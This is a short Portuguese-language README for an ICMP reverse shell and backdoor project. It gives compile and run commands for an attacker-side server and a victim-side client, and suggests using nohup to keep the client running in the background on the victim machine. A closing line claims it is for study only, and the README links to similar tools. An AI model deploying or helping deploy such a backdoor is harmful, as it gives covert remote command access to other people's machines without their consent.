# Reverse-Shell

# ICMP REVERSE SHELL / BACKDOOR

Olá, espero que você esteja bem, este projeto é sobre shell reverso usando icmp, aqui está como ele pode ser usado:

# Uso

Primeiramente, compile-o em sua máquina


Atacante:
```bash
gcc servidor.c -o servidor -pthread
```

Vítima:
```bash
gcc cliente.c -o cliente -pthread
```

#### Para executar o servidor:

```bash
./servidor <ip>
```

#### Execute o cliente na máquina vítima

```bash
./cliente
```

Você pode usar o nohup para colocar o processo em segundo plano

```bash
nohup ./client &
```

### Reverse Shell é apenas para fins de estudo



## Referências

[ICMPSH](https://github.com/bdamele/icmpsh)

[ICMPSHELL](https://github.com/sin5678/icmp_shell)

[ICMPDOOR](https://github.com/krabelize/icmpdoor)
# Reverse-Shell
